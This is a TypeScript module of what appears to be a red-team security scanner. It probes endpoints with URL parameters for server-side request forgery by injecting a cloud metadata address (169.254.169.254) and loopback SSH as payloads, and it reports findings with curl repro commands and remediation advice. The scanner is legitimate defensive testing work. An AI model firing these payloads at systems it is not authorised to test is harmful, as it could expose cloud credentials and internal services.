import type { RedTeamFinding } from '../types.js';
import type { ProbeContext, SecurityProbeModule } from './types.js';

export const ssrfProbe: SecurityProbeModule = {
  id: 'ssrf',
  name: 'Server-Side Request Forgery (SSRF) Boundary Probing',
  category: 'ssrf',
  defaultSeverity: 'critical',
  cwe: 'CWE-918',
  cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
  profiles: ['comprehensive', 'orchestrated'],

  match: () => true,

  run: async (context: ProbeContext): Promise<RedTeamFinding[]> => {
    const findings: RedTeamFinding[] = [];
    const { client, endpoints, options } = context;

    const ssrfCandidates = endpoints.filter((ep) => {
      const url = ep.url.toLowerCase();
      return (
        url.includes('url=') ||
        url.includes('dest=') ||
        url.includes('target=') ||
        url.includes('redirect=') ||
        url.includes('callback=') ||
        url.includes('webhook=') ||
        url.includes('feed=') ||
        ep.path.includes('/fetch') ||
        ep.path.includes('/proxy')
      );
    });

    const ssrfPayloads = [
      'http://169.254.169.254/latest/meta-data/',
      'http://127.0.0.1:22',
    ];

    for (const ep of ssrfCandidates) {
      const parsed = new URL(ep.url);
      const paramNames = Array.from(parsed.searchParams.keys());
      if (paramNames.length === 0) paramNames.push('url');

      for (const param of paramNames) {
        for (const payload of ssrfPayloads) {
          try {
            const probeUrl = new URL(ep.url);
            probeUrl.searchParams.set(param, payload);

            const res = await client.fetchText(probeUrl.toString(), {
              headers: options.authToken ? { Authorization: options.authToken } : {},
              timeoutMs: 2500,
            });

            if (
              res.text.includes('ami-id') ||
              res.text.includes('instance-id') ||
              res.text.includes('SSH-2.0') ||
              res.text.includes('OpenSSH')
            ) {
              findings.push({
                id: `SSRF-LOOPBACK-OR-METADATA-${param}`,
                title: `Server-Side Request Forgery (SSRF) on parameter '${param}'`,
                category: 'ssrf',
                severity: 'critical',
                description: `The endpoint fetched and reflected internal loopback or cloud metadata content (${payload}) via parameter '${param}'.`,
                target: probeUrl.toString(),
                evidence: {
                  request: { method: 'GET', url: probeUrl.toString() },
                  response: { status: res.status, snippet: res.text.slice(0, 300) },
                  reproCurl: `curl -i -s "${probeUrl.toString()}"`,
                },
                remediation: 'Validate and sanitize URL inputs against a strict domain allowlist. Block loopback and link-local IP addresses (127.0.0.1, 169.254.169.254).',
                cwe: 'CWE-918',
                evidenceLevel: 'reproduced',
                confidence: 0.95,
              });
            }
          } catch {
            // Continue
          }
        }
      }
    }

    return findings;
  },
};
